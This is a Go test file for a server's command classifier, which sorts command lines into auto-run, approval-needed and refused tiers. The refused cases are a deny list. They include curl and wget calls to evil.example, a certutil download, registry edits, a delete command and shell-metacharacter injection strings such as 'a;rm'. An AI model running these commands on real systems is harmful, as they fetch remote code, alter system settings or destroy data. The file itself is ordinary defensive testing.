package server

import (
	"os/exec"
	"runtime"
	"strings"
	"testing"
)

// TestClassifyCommandTiers 三档裁定：白名单直执 / 安全形态需批准 /
// 硬拒（shell、解释器、网络客户端、危险参数字符）。
func TestClassifyCommandTiers(t *testing.T) {
	auto := [][]string{
		{"ofd", "status"}, {"ofd", "gateway-key"}, {"ofd", "--version"},
		{"node", "-v"}, {"node", "--version"},
		{"npm", "-v"}, {"python", "--version"}, {"py", "--version"},
		{"git", "--version"}, {"go", "version"}, {"tasklist"},
		{"where", "hmharness"}, {"which", "codex"},
	}
	// .exe 归一化仅 Windows 生效（normalizeProgram 按 GOOS 剥后缀）。
	if runtime.GOOS == "windows" {
		auto = append(auto, []string{"OFD.EXE", "status"})
	}
	for _, f := range auto {
		if d, _ := classifyCommand(f); d != execAuto {
			t.Errorf("want auto for %v, got %d", f, d)
		}
	}
	refused := [][]string{
		{"cmd", "/c", "dir"},
		{"powershell", "-Command", "ls"},
		{"bash", "-c", "ls"},
		{"curl", "http://evil.example/x"},
		{"wget", "http://evil.example/x"},
		{"certutil", "-urlcache", "-f", "http://x/y", "z"},
		{"reg", "add", "HKCU\\Environment"},
		{"setx", "OMNIFUSION_API_KEY", "x"},
		{"taskkill", "/IM", "ofd.exe"},
		{"del", "C:\\important"},
		{"node", "evil.js"},          // 解释器（非白名单形态）
		{"python", "evil.py"},        // 同上
		{"git", "clone", "http://x"}, // git 仅 --version 可用
		{"sh", "-c", "ls"},
		{},               // 空
		{"echo", "a;rm"}, // 元字符
		{"echo", "a&b"},
		{"echo", "a|b"},
		{"echo", "a>b"},
		{"echo", "\"quoted\""},
		{"echo", strings.Repeat("x", 200)}, // 超长参数
	}
	for _, f := range refused {
		if d, _ := classifyCommand(f); d != execRefuse {
			t.Errorf("want refuse for %v, got %d", f, d)
		}
	}
	approval := [][]string{
		{"hostname"},
		{"hmharness", "--version"},
		{"code", "--version"},
		{"qwen", "chat", "--help"},
	}
	for _, f := range approval {
		if d, _ := classifyCommand(f); d != execApproval {
			t.Errorf("want approval for %v, got %d", f, d)
		}
	}
}

// TestRunCommandExecNoShell 真执行一条白名单命令（go version，CI/本机
// 都有 go）；输出含版本串、exit 0。go 不在 PATH 则跳过。
func TestRunCommandExecNoShell(t *testing.T) {
	goPath, err := exec.LookPath("go")
	if err != nil {
		t.Skip("go not in PATH")
	}
	s := &Server{}
	out := s.runCommand([]string{goPath, "version"})
	if out["error"] != nil {
		t.Fatalf("run failed: %v", out["error"])
	}
	if out["exit_code"] != 0 || out["timed_out"] != false {
		t.Errorf("exit=%v timed_out=%v", out["exit_code"], out["timed_out"])
	}
	if !strings.Contains(out["output"].(string), "go version") {
		t.Errorf("output = %v", out["output"])
	}
}
